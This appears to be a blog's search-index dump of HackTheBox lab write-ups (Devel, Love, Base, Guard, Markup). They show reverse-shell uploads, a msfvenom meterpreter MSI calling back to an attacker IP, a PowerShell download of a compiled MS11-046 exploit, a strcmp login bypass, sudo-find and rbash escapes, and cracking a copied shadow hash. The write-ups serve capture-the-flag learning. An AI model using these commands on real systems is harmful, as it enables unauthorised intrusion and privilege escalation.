as anonymous Let’s connect to it ftp anonymous Well, I can’t find anything on it So, I’m thinking this FTP might have been connected to the other port [port 80]. ","date":"27-08-2021","objectID":"/posts/htb/devel/:1:2","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"WebPage As we saw the image above. It has a welcome.png image. Let’s put that on the URL default IIS webpage COOL! ","date":"27-08-2021","objectID":"/posts/htb/devel/:1:3","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"27-08-2021","objectID":"/posts/htb/devel/:2:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"ASPX Reverse Shell Let’s try to get the reverse shell So, this is Microsoft IIS with light googling. I’ve found the aspx reverse shell Source Github - borjmz I’m gonna put the reverse shell on the FTP server Then, execute it with the curl command shell as iis apppool\\web I’m in as iis apppool\\web ","date":"27-08-2021","objectID":"/posts/htb/devel/:2:1","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"systeminfo Let’s enumerate this machine. First, I’m gonna run the systeminfo command the result systeminfo OK! WOW! we’re on Microsoft Windows 7 and it’s a really old machine. Again. I’m gonna google around. ","date":"27-08-2021","objectID":"/posts/htb/devel/:2:2","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"27-08-2021","objectID":"/posts/htb/devel/:3:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"MS11-046 found an exploit I’ve found this exploit Let’s download it and compile the exploit -\u003e don’t worry, they got the compiling instructions ","date":"27-08-2021","objectID":"/posts/htb/devel/:3:1","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Compiling Exploit Tip If you got this response after try to compiling command not found: i686-w64-mingw32-gcc Just run this command to install it apt install mingw-w64 This is the command for compiling i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 After it is done, you got the binary in your directory called MS11-046.exe ","date":"27-08-2021","objectID":"/posts/htb/devel/:3:2","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Transfer the Exploit Turns out, this machine has PowerShell I’m gonna host my file with a python webserver python3 -m http.server Let’s transfer the exploit using PowerShell with this command. Source -\u003e Jourdant - 3 ways to download files with PowerShell powershell.exe -c \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/MS11-046.exe', 'c:\\users\\public\\documents\\lol.exe')\" Then, execute it. become nt authority\\system YES! I’m become SYSTEM ","date":"27-08-2021","objectID":"/posts/htb/devel/:3:3","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"User Flag user flag ","date":"27-08-2021","objectID":"/posts/htb/devel/:4:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Administrator Flag root flag ","date":"27-08-2021","objectID":"/posts/htb/devel/:5:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. If you using File Transfer Protocol [FTP] make sure to configure it properly and avoid using anonymous access. Lastly, just update the system or even better use the new and up-to-date version of windows. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"27-08-2021","objectID":"/posts/htb/devel/:6:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Enumeration scan top 1000 ports nmap -sC -sV -oN nmap/initial 10.10.10.239 the result # Nmap 7.91 scan initiated Sat Aug 14 02:50:38 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.239 Nmap scan report for 10.10.10.239 Host is up (0.28s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, Help, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, oracle-tns: |_ Host '10.10.14.7' is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=8/14%Time=6116BF2A%P=x86_64-unknown-linux-gnu SF:%r(HTTPOptions,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20n SF:ot\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(R SF:PCCheck,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20a SF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(DNSStatu SF:sRequestTCP,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\ SF:x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(Help SF:,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\ SF:x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(SSLSessionReq,4 SF:9,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x2 SF:0to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(TerminalServerCoo SF:kie,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allow SF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(TLSSessionRe SF:q,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed SF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(SMBProgNeg,49, SF:\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20t SF:o\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(X11Probe,49,\"E\\0\\0\\ SF:x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20co SF:nnect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(FourOhFourRequest,49,\"E\\0\\ SF:0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20 SF:connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LPDString,49,\"E\\0\\0\\x01\\ SF:xffj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20connec SF:t\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LDAPSearchReq,49,\"E\\0\\0\\x01\\xf SF:fj\\x04Host\\x20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\ SF:x20to\\x20this\\x20MariaDB\\x20server\")%r(NCP,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x SF:20'10\\.10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20thi SF:s\\x20MariaDB\\x20server\")%r(NotesRPC,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\. SF:10\\.14\\.7'\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20Ma SF:riaDB\\x20server\")%r(oracle-tns,49,\"E\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.1 SF:4\\.7'\\x","date":"25-08-2021","objectID":"/posts/htb/love/:1:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Open Ports This machine have webserver on port 80,443 and 5000. Also, SMB The nmap scan found the host name staging.love.htb love.htb added to the /etc/hosts file. ","date":"25-08-2021","objectID":"/posts/htb/love/:1:1","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"WebPage [love.htb] Let’s take look at love.htb login page It’s just a login page. We need credentials to access it ","date":"25-08-2021","objectID":"/posts/htb/love/:1:2","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Gobuster I’m gonna run the gobuster scan in the background gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php the result gobuster I’ll try my best to enumerate it. unfortunately, I can’t find anything yet. Let’s check the other site. ","date":"25-08-2021","objectID":"/posts/htb/love/:1:3","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"WebPage [staging.love.htb] staging.love.htb webpage Well, this is just free file scanner app. I try to sign up but it didn’t work. However, I found the input form in the demo tab (at the top navbar) input form It scans the file by entering the URL Now, I’m gonna start the python web server and make a request python3 http server then, put the URL. we’ve got the response. 404 response ","date":"25-08-2021","objectID":"/posts/htb/love/:1:4","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"SSRF Server Side Request Forgery [SSRF] Description The attacker can supply or modify a URL which the code running on the server will read or submit data, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases or perform post requests towards internal services which are not intended to be exposed. OWASP - Server Side Request Forgery PortSwigger - Server-side request forgery (SSRF) Remember the Nmap scan earlier. we’ve found port 5000 open and running Apache but we can’t reach it. So, I’m gonna make the server do request on itself by putting http://127.0.0.1:5000 the result found admin credential cool! we’ve got the admin credentials gobuster scan earlier found the /admin/ directory let’s login with those creds ","date":"25-08-2021","objectID":"/posts/htb/love/:1:5","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"25-08-2021","objectID":"/posts/htb/love/:2:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"WebPage [love.htb/admin] admin webpage We’ve got access to the admin panel Let’s enumerate the admin panel. I’ve found the upload section on the admin update profile upload button Let’s upload the reverse shell navigate to love.htb/images/\u003cfilename\u003e to activate the reverse shell ","date":"25-08-2021","objectID":"/posts/htb/love/:2:1","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Phoebe success! we’ve got the shell Let’s get the user flag shell as phoebe ","date":"25-08-2021","objectID":"/posts/htb/love/:3:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"User Flag user flag ","date":"25-08-2021","objectID":"/posts/htb/love/:3:1","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"WinPEAS Now, I’m gonna upload the WinPEAS Then, run the binary winPEAS To be honest, I can’t find anything at all. Then, I just keep opening the link that has red color Man oh man, I’ve found it. ","date":"25-08-2021","objectID":"/posts/htb/love/:3:2","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Privilege Escalation winPEAS output - AlwaysInstallElevated Checking AlwaysInstallElevated Let’s googling around. I’ve found some good source Source Hacking Articles - Windows Privilege Escalation (AlwaysInstallElevated) HackTricks - windows-local-privilege-escalation Microsoft - AlwaysInstallElevated ","date":"25-08-2021","objectID":"/posts/htb/love/:4:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"AlwaysInstallElevated Description As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by MSI packages for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users How, we wanna know if this AlwaysInstallElevated can use? If these 2 registers are enable (value is 0x1) then, users of any privilege can install (execute) *.msi files as NT AUTHORITY/SYSTEM Source HackTricks - windows-local-privilege-escalation ","date":"25-08-2021","objectID":"/posts/htb/love/:4:1","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Checking the register Let’s try to do it. First, let’s check the value of the 2 registers reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer the result attack vector So, the value of those 2 registers are in facts 0x1 Now, we know we can exploit it. ","date":"25-08-2021","objectID":"/posts/htb/love/:5:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Generate MSI files So, I’m gonna generate MSI package file with msfvenom. msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.14 lport=9902 -f msi \u003e lol.msi After successfully generate the files Then, upload the file into the target machine. ","date":"25-08-2021","objectID":"/posts/htb/love/:6:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"exploit/multi/handler Before we can execute it. We need to set up the \"listener\" for our meterpreter reverse shell setup listener ","date":"25-08-2021","objectID":"/posts/htb/love/:6:1","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Execute the MSI file Let’s execute those files msiexec /quiet /qn /i lol.msi # flags explain /quiet = Suppress any messages to the user during installation /qn = No GUI /i = Regular (vs.administrative) installation the result shell as nt authority\\system we’ve got the shell and become NT AUTHORITY/SYSTEM ","date":"25-08-2021","objectID":"/posts/htb/love/:6:2","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Administrator Flag root flag ","date":"25-08-2021","objectID":"/posts/htb/love/:6:3","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. First, enumerate is the key. YES! it is important. I always heard SSRF and this machine introduces it to me and guess what. I’m so phreaking excited. Also, always ask yourself it is your web app is secure because like we know this machine web app doesn’t have any filter at the upload form and it’s even allowed php file to be uploaded at the photo upload form. Make sure to configure your machine properly. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"25-08-2021","objectID":"/posts/htb/love/:7:0","tags":["ssrf","upload-vuln","AlwaysInstallElevated","winpeas","msfvenom","gobuster","msi-file"],"title":"HackTheBox - Love Writeup","uri":"/posts/htb/love/"},{"categories":["HacktheBox"],"content":"Enumeration Top 1000 ports scan nmap -sC -sV -oN nmap/initial 10.10.10.48 the result nmap scan result All ports scan nmap -sC -sV -p- -oN nmap/all__ports 10.10.10.48 the result nmap scan allports ","date":"13-08-2021","objectID":"/posts/htb/base/:1:0","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Open Ports both Nmap scan result shows the only port open are SSH and HTTP ","date":"13-08-2021","objectID":"/posts/htb/base/:1:1","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Gobuster gobuster dir -u http://10.10.10.48 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php.html -o Rgobuster We’ve found couples of hidden directory the result http://10.10.10.48/login/ http://10.10.10.48/static/ http://10.10.10.48/_uploaded/ let’s take a look at /login/ directory directory listing Config.php sounds fantastic but I can’t read them. However, the file login.php.swp can be download. well, let’s download that file and take a peek at it ","date":"13-08-2021","objectID":"/posts/htb/base/:1:2","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"login.php.swp let’s strings that file out the result login.php.swp file well, it is a piece of code on how the login form works it’s just logic if-else statements but again my eye caught something else. ","date":"13-08-2021","objectID":"/posts/htb/base/:1:3","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Strcmp bypass php strcmp Description Returns \u003c 0 if string1 is less than string2; \u003e 0 if string1 is greater than string2, and 0 if they are equal. it compares the string1 and string2 . If they equal returns 0 Again we don’t know the password. we can make it one of the strings into arrays because it will returns NULL when NULL == 0 it will returns 0 Source PHP - strcmp Anirudh Anand - Bypassing PHP strcmp() - CSAW 2015 web 200 writeup Danuxx - Unauthorized Access: Bypassing PHP strcmp() ","date":"13-08-2021","objectID":"/posts/htb/base/:1:4","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"13-08-2021","objectID":"/posts/htb/base/:2:0","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Devtools Let’s navigate to the login page http://10.10.10.48/login/login.php. Now, we’ve learned how these login forms work. Let’s try strcmp bypass First, I’m gonna insert something in those username and password fields. Then, open up the Devtools and go to the Network tab. Right-click and click on Edit and Resend it should look like this. devtools Then edit the Request Body something like this username[]=''\u0026password[]='' After that, click on Send and you should see the upload.php appears. modify login request ","date":"13-08-2021","objectID":"/posts/htb/base/:2:1","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Upload Now, you have to do is Double-click on upload.php and you should greet by this page. upload page That means we successfully bypass the login. So, I’m gonna upload the PHP reverse shell I’m successfully uploaded. Remember those gobuster scans we did earlier. we’ve found the directory called _uploaded Let’s navigate the URL and the file name. Hopefully, it will execute the revshell. http://10.10.10.48/_uploaded/\u003cfilename\u003e shell as www-data we’ve got the shell ","date":"13-08-2021","objectID":"/posts/htb/base/:2:2","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"config.php I’m in. remember the file called config.php we’ve found earlier but sadly we can’t read it. Now, it’s the time to read it. Let’s navigate into this directory /var/www/html/login/. Then, read the config.php file password in config.php ","date":"13-08-2021","objectID":"/posts/htb/base/:2:3","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"John So, we’ve found the password. Maybe this password belongs to the user on this system. Let’s cat /etc/passwd check user in /etc/password we found one user name john. Let’s try login as john with those password we’ve found. change user to john Great. Now, I’m John ","date":"13-08-2021","objectID":"/posts/htb/base/:3:0","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"User Flag user flag ","date":"13-08-2021","objectID":"/posts/htb/base/:3:1","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Privilege Escalation OK. I’ve got the user password. Let’s try to check the sudo permission this user got with this commands sudo -l the result check sudo permission Well, Let’s try to become root by running this command Source GTFObins - find sudo /usr/bin/find . -exec /bin/bash \\; -quit become root ","date":"13-08-2021","objectID":"/posts/htb/base/:4:0","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Root Flag root flag ","date":"13-08-2021","objectID":"/posts/htb/base/:4:1","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. Do not expose anything on the internet. Make sure your website properly configure. If your website offers to upload something. Make it harder for an attacker to upload that related to security risks such as reverse shell. Once again, don’t use the same password. Oh before I forgot. Configure the user and the root properly. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"13-08-2021","objectID":"/posts/htb/base/:5:0","tags":["strcmp-bypass","upload-vuln","GTFOBins","gobuster","SUID"],"title":"HackTheBox - Base Writeup","uri":"/posts/htb/base/"},{"categories":["HacktheBox"],"content":"Enumeration Top 1000 ports scan nmap -sC -sV -oN nmap/initial 10.10.10.50 the result nmap initial scan scan all ports nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.50 the result nmap allports scan ","date":"08-08-2021","objectID":"/posts/htb/guard/:1:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Open Ports Well, both nmap scan result shows SSH port just open ","date":"08-08-2021","objectID":"/posts/htb/guard/:1:1","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"08-08-2021","objectID":"/posts/htb/guard/:2:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"SSH Let’s try SSH into the machine using the private key we’ve got from the previous box markup. ssh as daniel It works ","date":"08-08-2021","objectID":"/posts/htb/guard/:2:1","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"rBash Well, I’m login as daniel and I found the user flag already. However, it’s odd. When I try to read the content of the file It doesn’t have any output. daniel user in rbash Turns out this user have rbash/Restricted Bash Shell Let’s try bypass it Source TecMint - rBash Explained Hacking Articles - Multiple Methods to Bypass rBash ","date":"08-08-2021","objectID":"/posts/htb/guard/:2:2","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"User Flag I’m gonna try bypass it using ed the result bypass rbash using ed Finally, I can read the user.txt file That’s means we successfully bypass the rBash ","date":"08-08-2021","objectID":"/posts/htb/guard/:3:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"08-08-2021","objectID":"/posts/htb/guard/:4:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Backup Now, let’s start enumeration inside this box. These are some of the commands I run for manual enumeration. Source House of Note - Manual Enumeration I try looking at the backup file with the .bak extension find / -iname '*.bak' -exec ls -l {} \\; 2\u003e/dev/null found backup files We’ve found couples backup files but I can’t read them. Let’s try another approach. locate backup found /var/backups/shadow Well, I’ve found this. Let’s try read /var/backups/shadow file the result get the root hash Nice. We’ve got hashes. Let’s try to crack it ","date":"08-08-2021","objectID":"/posts/htb/guard/:4:1","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"HashCat Description Hashcat is a password recovery tool. Examples of hashcat-supported hashing algorithms are LM hashes, MD4, MD5, SHA-family, and Unix Crypt formats as well as algorithms used in MySQL and Cisco PIX. Wikipedia - Hashcat hashcat.net Now, I’m gonna copy and paste the root hash into a file called root Here is the link to hashcat example hashes I’m gonna run this command and use rockyou.txt as a wordlist hashcat -m 1800 root /opt/rockyou.txt crack root password Note: I’ve already run it that’s why I’m using --show at the end ","date":"08-08-2021","objectID":"/posts/htb/guard/:4:2","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Root Let’s change our user into the root by using this command su when it’s prompt for the password. Just insert the password we crack earlier change user to root ","date":"08-08-2021","objectID":"/posts/htb/guard/:5:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Root Flag Let’s get the final flag Nice root flag ","date":"08-08-2021","objectID":"/posts/htb/guard/:6:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. What is the rBash and how to bypass it. The most important thing is how you store your data or backup. If you do not properly store it or not configure the permission carefully. This thing might gonna happen. Once again, don’t use the same password. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"08-08-2021","objectID":"/posts/htb/guard/:7:0","tags":["rbash","hashcat","bypass-rbash"],"title":"HackTheBox - Guard Writeup","uri":"/posts/htb/guard/"},{"categories":["HacktheBox"],"content":"Enumeration Top 1000 ports scan nmap -sC -sV -oN nmap/initial 10.10.10.49 the result nmap initial scan All ports scan nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49 the result nmap allports scan ","date":"06-08-2021","objectID":"/posts/htb/markup/:1:0","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Open Ports Well, both the Nmap scan result are the same port 22/SSH port 80/HTTP port 443/HTTPs ","date":"06-08-2021","objectID":"/posts/htb/markup/:1:1","tags":["xxe","xxe-read-file","icacls","checking-file-permission-windows"],"title":"HackTheBox - Markup Writeup","uri":"/posts/htb/markup/"},{"categories":["HacktheBox"],"content":"Webpage Let’s take a look at the webpage HTTP login webpage Look’s like just a regular login page. We can try to login with credentials we’ve found from the previous box called Included Let’s try it home webpage Success Now, time to enumerate/play around with this page. 